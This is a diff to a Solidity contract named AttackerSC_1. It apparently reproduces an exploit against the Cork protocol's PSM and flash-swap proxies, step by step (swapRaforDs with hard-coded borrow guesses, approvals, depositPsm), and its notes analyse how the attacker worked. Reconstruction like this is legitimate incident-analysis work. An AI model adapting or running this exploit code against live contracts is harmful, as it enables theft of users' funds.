@@ -10,7 +10,7 @@ contract AttackerSC_1 {
     IERC20 public wstETH;
     IERC20 public weETH5CT;
     ICorkHook corkHook;
-    IPSMProxy psmProxy;
+    IPSMProxy moduleCoreProxy;
     IPSMProxy flashSwapProxy;
     IExchangeRateProvider exchangeRateProvider;
 
@@ -24,7 +24,7 @@ contract AttackerSC_1 {
         address _wstETH,
         address _weETH5CT,
         address _corkHook,
-        address _psmProxy,
+        address _moduleCoreProxy,
         address _flashSwapProxy,
         address _rateProvider
     ) {
@@ -32,7 +32,7 @@ contract AttackerSC_1 {
         wstETH = IERC20(_wstETH);
         weETH5CT = IERC20(_weETH5CT);
         corkHook = ICorkHook(_corkHook);
-        psmProxy = IPSMProxy(_psmProxy);
+        moduleCoreProxy = IPSMProxy(_moduleCoreProxy);
         flashSwapProxy = IPSMProxy(_flashSwapProxy);
         exchangeRateProvider = IExchangeRateProvider(_rateProvider);
         attacker_EOA = msg.sender;
@@ -70,21 +70,21 @@ contract AttackerSC_1 {
 
         // Sending an empty guess, incurrs in greater gas expenses. The attacker made some guesses.
         IPSMProxy.OffchainGuess memory offchainGuess;
-        // offchainGuess.initialBorrowAmount = 2_035_043_806_577_874_200;
-        // offchainGuess.afterSoldBorrowAmount = 2_554_953_564_824_393_000;
+        offchainGuess.initialBorrowAmount = 2_035_043_806_577_874_200;
+        offchainGuess.afterSoldBorrowAmount = 2_554_953_564_824_393_000;
 
         // TODO: We need to identify how the attacker calculated the amount
         flashSwapProxy.swapRaforDs(PAIR_ID_FOR_RATE, 1, 3_407_593_947_121_416, 0, buyParams, offchainGuess);
 
         // Step 1.7. Reset wstETH approvals and grant again type(uint256).max to the same Cork's proxy.
         wstETH.approve(address(flashSwapProxy), 0);
-        wstETH.approve(address(psmProxy), type(uint256).max);
+        wstETH.approve(address(moduleCoreProxy), type(uint256).max);
 
         // Step 1.8. Deposit into proxy's PSM with depositPsm
-        psmProxy.depositPsm(PAIR_ID_FOR_RATE, 10e6);
+        moduleCoreProxy.depositPsm(PAIR_ID_FOR_RATE, 10e6);
 
         // Step 1.9. Reset wstETH approval to proxy back to zero, approve wstETH and weETH5CT to CorkHook
-        wstETH.approve(address(psmProxy), 0);
+        wstETH.approve(address(moduleCoreProxy), 0);
         uint256 weBalance = weETH5CT.balanceOf(address(this));
 
         wstETH.approve(address(corkHook), type(uint256).max);
